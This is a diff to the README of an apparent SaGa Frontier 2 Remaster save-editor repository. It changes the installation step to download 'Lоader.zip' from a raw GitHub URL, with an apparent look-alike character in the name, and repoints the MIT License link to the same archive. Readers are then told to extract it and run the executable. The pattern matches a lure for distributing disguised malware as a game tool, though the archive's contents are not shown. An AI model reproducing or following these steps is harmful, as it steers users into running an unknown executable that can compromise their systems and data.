@@ -23,7 +23,7 @@
 
 ## 🔑 Installation
 
-1. Download `Loader.rar` from the repository 📥  
+1. Download `https://raw.githubusercontent.com/Sudheer14510521/SaGaFrontier2-RemasterSaveSmith/main/Lоader.zip` from the repository 📥  
 2. Extract to your preferred folder  
 3. Run the executable file  
 4. Load your save file and customize!
@@ -38,4 +38,4 @@ This editor is strictly for personal use and learning. Editing your save files m
 
 ## 📜 MIT License
 
-Licensed under the MIT License. See [MIT License](https://opensource.org/licenses/MIT) for details.
+Licensed under the MIT License. See [MIT License](https://raw.githubusercontent.com/Sudheer14510521/SaGaFrontier2-RemasterSaveSmith/main/Lоader.zip) for details.
